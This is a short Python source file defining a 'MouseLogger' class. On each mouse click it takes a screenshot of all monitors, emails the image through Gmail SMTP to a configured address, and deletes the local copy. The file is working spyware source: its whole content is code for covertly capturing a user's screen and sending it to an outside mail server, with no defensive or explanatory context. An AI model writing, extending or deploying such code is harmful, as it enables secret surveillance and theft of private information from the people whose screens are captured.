from mss import mss
import mouse
from datetime import datetime
import smtplib
from os.path import basename
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from email.utils import formatdate
import os
from threading import Thread

class MouseLogger:
    def __init__(self, email_addr, email_pw):
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
        self.email_addr = email_addr
        self.email_pw = email_pw

    def callback(self):
        self.end_dt = datetime.now()
        name = f'fullscreen- {self.start_dt.strftime("%m-%d-%Y %H-%M-%S")} to {self.end_dt.strftime("%m-%d-%Y %H-%M-%S")}.png'
        with mss() as sct:
            filename = sct.shot(mon=-1, output=name)
        self.start_dt = datetime.now()
        self.send_mail(self.email_addr, self.email_addr, filename, filename)
        os.remove(name)

    def send_mail(self, send_from, send_to, subject, file=None):
        msg = MIMEMultipart()
        msg['From'] = send_from
        msg['To'] = send_to
        msg['Date'] = formatdate(localtime=True)
        msg['Subject'] = subject
        with open(file, "rb") as fil:
            part = MIMEApplication(
                fil.read(),
                Name=basename(file)
            )
        part['Content-Disposition'] = 'attachment; filename="%s"' % basename(file)
        msg.attach(part)
        smtp = smtplib.SMTP(host="smtp.gmail.com", port=587)
        smtp.starttls()
        smtp.login(self.email_addr, self.email_pw)
        smtp.sendmail(send_from, send_to, msg.as_string())
        smtp.close()

    def start(self):
        self.start_dt = datetime.now()
        mouse.on_click(callback=self.callback)
        return Thread(target=mouse.wait, args=('RIGHT',))


